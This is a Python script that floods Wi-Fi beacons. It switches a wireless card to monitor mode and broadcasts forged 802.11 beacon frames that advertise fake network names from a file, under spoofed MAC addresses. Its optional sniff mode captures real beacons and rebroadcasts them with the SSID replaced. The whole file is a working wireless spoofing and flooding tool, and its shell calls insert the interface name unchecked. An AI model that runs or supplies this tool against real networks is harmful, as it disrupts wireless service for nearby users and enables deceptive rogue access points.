import os, sys, time, socket, struct, fcntl, re
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import pcap
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

class Flooding:
    def __init__(self, iface=None, essid_list=None, sniffFlag=None):
        self.monitor_on = False
        self.mon_iface = self.get_mon_iface(iface)
        self.iface = self.mon_iface
        self.essid_list = essid_list
        self.sniffFlag = sniffFlag
        self.exit = False

    def get_mon_iface(self, iface):
        if iface:
            if self.check_monitor(iface):
                self.monitor_on = True
                return iface

    def check_monitor(self, iface):
        try:
            proc = Popen(['iwconfig', iface], stdout=PIPE, stderr=PIPE)
            data =  proc.communicate()
            if "Mode:Monitor" in data[0].decode():
                return True
            elif "No such device" in data[1].decode():
                print("Interface not found")
                return False
            print("Interface is not in mode monitor")
            self.start_mon_mode(iface)
            return True
        except OSError:
            print('Could not execute "iwconfig"')
            return False

    def start_mon_mode(self, interface):
        print(f'Starting monitor mode off {interface}')
        try:
            os.system('ifconfig %s down' % interface)
            os.system('iwconfig %s mode monitor' % interface)
            os.system('ifconfig %s up' % interface)
            return interface
        except Exception:
            print('Could not start monitor mode')
            self.exit = True

    def sniffNflood(self):
        sniffer = pcap.pcap(name=self.mon_iface, promisc=True, immediate=True, timeout_ms=50)

        i = 0
        for ts, pkt in sniffer:
            frame_control = pkt[0x18]

            if frame_control == 0x80: #chk beacon frame
                tag_offset = 0x3c
                while tag_offset < len(pkt):
                    tag_num = pkt[tag_offset]
                    tag_len = pkt[tag_offset+1]

                    #print(tag_num, tag_len)
                    if tag_num == 0:
                        break

                    tag_offset += tag_len + 2

                netSSID = self.essid_list[i % len(self.essid_list)].strip()
                frame = pkt[:tag_offset+1] + len(netSSID).to_bytes(1, byteorder="big") + netSSID.encode() + pkt[tag_offset+2+tag_len:]
                sendp(frame, iface=self.mon_iface, loop=0, verbose=False)
                print(".", end = '')
                i += 1

    def beacon_flood(self):
        while True:
            for netSSID in self.essid_list:
                netSSID = netSSID.strip()
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
                rsn = Dot11Elt(ID='RSNinfo', info=(
                '\x01\x00'                 #RSN Version 1
                '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
                '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
                '\x00\x0f\xac\x04'         #AES Cipher
                '\x00\x0f\xac\x02'         #TKIP Cipher
                '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
                '\x00\x0f\xac\x02'         #Pre-Shared Key
                '\x00\x00'))               #RSN Capabilities (no extra capabilities)

                frame = RadioTap()/dot11/beacon/essid/rsn

                sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=False)
                print(".", end = '')

    def run(self):
        if(self.sniffFlag):
            self.sniffNflood()
        else:
            self.beacon_flood()

if __name__ == "__main__":
    if os.geteuid():
        print("Please run as root")
    else:

        if len(sys.argv) < 3:
            print("Usage: sudo python3 airodump.py <interface> <ssid-list-file> [sniff]")
            sys.exit()

        iface = sys.argv[1]

        with open(sys.argv[2]) as essidListFile:
            essid_list = essidListFile.readlines()

        try:
            if(sys.argv[3]):
                sniffFlag = True
        except:
            sniffFlag = False

        if iface != "" :
            sn = Flooding(iface=iface,essid_list=essid_list,sniffFlag=sniffFlag)
            sn.run()
